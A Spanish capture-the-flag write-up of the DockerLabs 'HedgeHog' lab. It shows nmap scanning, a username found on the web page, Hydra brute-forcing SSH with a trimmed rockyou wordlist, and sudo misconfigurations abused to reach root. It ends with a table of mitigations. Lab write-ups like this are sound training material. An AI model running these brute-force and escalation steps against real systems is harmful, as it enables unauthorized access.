# HedgeHog — DockerLabs Writeup

**Platform:** DockerLabs | **Difficulty:** Very Easy | **Target IP:** 172.17.0.2 | 

## Descripcion 

Laboratorio para practicar fuerza bruta SSH y escalada de privilegios mediante movimiento entre usuarios.

##  Attack Chain

**Nmap → Web Enumeration → User Disclosure → SSH Brute Force → SSH Access → User Switching → Sudo Misconfiguration → Root**

### 1- Realizamos una busqueda para verificar puertos y servicios activos.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ nmap -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 19:29 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000014s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
|_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: AA:14:C1:EB:9C:76 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds

```
Nos encontramos con dos servicios, SSH y Apache.

### 2. Hydra - SSH y escalada de privilegios.

Realizamos un curl para tener el codigo HTML de la pagina.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ curl 172.17.0.2
tails

```
Utilizamos esto como pista deduciendo que es el usuario de SSH, teniendo en cuenta eso, tail es un comando de linux para visualizar las ultimas lineas de un archivo de texto, creamos un rockyou invertido

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ tail -n 500  /usr/share/wordlists/rockyou.txt > rocku.txt

```
Intentamos con hydra obtener la contraseña.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ sudo hydra -l tails -P rockyu.txt -t 4 -f 172.17.0.2 ssh -V 
[sudo] password for mariano: 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-06 23:16:03
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "*7¡Vamos!" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass a6_123" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass abygurl69" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass ie168" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "▒xCvBnM," - 5 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "           " - 6 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "            " - 7 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "                  " - 8 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "       1" - 9 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "       1234567" - 10 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "      7" - 11 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "     123d" - 12 of 14344399 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "     54321" - 13 of 14344399 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "     mara" - 14 of 14344399 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "     markinho" - 15 of 14344399 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "tails" - pass "     pepe" - 16 of 14344399 [child 3] (0/0)
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.

```
Al iniciar el ataque visualizamos que hay espacios, sangrias en la contraseña, eliminamos los espacios y probamos nuevamente. 

```                                                                                                                      
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ sed -i 's/^[ \t]*//' rocku.txt    
```
Intentamos nuevamente habiendo sacado los espacios.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ sudo hydra -l tails -P rocku.txt -t 64 -f 172.17.0.2 ssh   
[sudo] password for mariano: 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-06 23:39:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 498 login tries (l:1/p:498), ~8 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-06 23:40:05

```
Ingresamos y escalamos privilegios.

```                                                                                                                        
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/hedgehog]
└─$ ssh tails@172.17.0.2
tails@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 7.1.5+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
tails@ea8d12a4479f:~$ sudo -l
User tails may run the following commands on ea8d12a4479f:
    (sonic) NOPASSWD: ALL
tails@ea8d12a4479f:~$ sudo -u sonic bash
sonic@ea8d12a4479f:/home/tails$ sudo -l
User sonic may run the following commands on ea8d12a4479f:
    (ALL) NOPASSWD: ALL
sonic@ea8d12a4479f:/home/tails$ sudo su
root@ea8d12a4479f:/home/tails# 

```

## Conclusión.

| Vulnerabilidad / Mala configuración                                   | Impacto                                                                                                                                                                                                                                  | Mitigación                                                                                                                                                                                        |
| --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Credenciales SSH susceptibles a fuerza bruta**                      | Una vez identificado el usuario `tails`, un atacante puede realizar ataques automatizados contra SSH utilizando herramientas como `Hydra` y diccionarios de contraseñas.                                                                 | Utilizar contraseñas fuertes y únicas, implementar mecanismos de bloqueo o rate limiting y, cuando sea posible, utilizar autenticación mediante claves SSH.                                       |
| **Contraseña vulnerable a ataques mediante diccionarios modificados** | La contraseña del usuario `tails` pudo ser descubierta utilizando una variante del diccionario `rockyou.txt`, demostrando que una contraseña puede ser vulnerable incluso cuando no aparece directamente en un diccionario convencional. | Utilizar contraseñas largas, aleatorias y únicas que no estén basadas en palabras o patrones previsibles.                                                                                         |
| **Permisos `sudo` excesivos para el usuario `sonic`**                 | El usuario `sonic` puede ejecutar cualquier comando como cualquier usuario mediante `sudo` sin necesidad de contraseña debido a la configuración `(ALL) NOPASSWD: ALL`.                                                                  | Aplicar el principio de mínimo privilegio y permitir únicamente los comandos estrictamente necesarios. Evitar configuraciones como `NOPASSWD: ALL` salvo que exista una justificación específica. |
| **Escalada de privilegios hasta `root`**                              | La combinación del acceso inicial mediante SSH y los permisos excesivos de `sudo` permite obtener una shell con privilegios `root` y comprometer completamente el sistema.                                                               | Revisar periódicamente las reglas de `sudo`, limitar los privilegios de los usuarios y auditar las configuraciones de seguridad del sistema.                                                      |

### Recomendaciones generales

* Utilizar contraseñas robustas, largas y únicas.
* Implementar mecanismos de protección contra ataques de fuerza bruta.
* Preferir autenticación mediante **claves SSH** en lugar de contraseñas.
* Restringir el acceso SSH únicamente a los usuarios que lo necesiten.
* Revisar periódicamente las configuraciones de `sudo`.
* Evitar utilizar reglas excesivamente permisivas como `NOPASSWD: ALL`.
* Aplicar siempre el principio de **mínimo privilegio**.
* Auditar periódicamente los servicios y permisos disponibles en el sistema.





